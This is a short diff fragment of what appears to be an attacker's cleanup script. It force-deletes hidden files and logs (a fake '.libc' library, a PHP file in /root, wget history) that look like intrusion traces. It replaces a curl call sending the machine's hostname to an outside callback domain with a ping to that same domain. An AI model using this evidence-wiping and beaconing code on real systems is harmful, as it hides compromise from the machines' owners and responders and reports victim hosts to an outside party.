@@ -7,4 +7,4 @@ rm -rf  /var/tmp/.cache_hsperfdata
 rm -rf /var/tmp/.syslog
 rm -rf /usr/.123 /usr/lib/.libc-K8*
 rm -rf /root/.wget-hsts ~/.wget-hsts /tmp/.hypre ~/wget-log* /var/tmp/.cache_hsperfdata /root/2.php
-curl -k -m 2 `hostname`.lshub.s.dlog.fun
+ping -c 1 lshb.s.dlog.fun
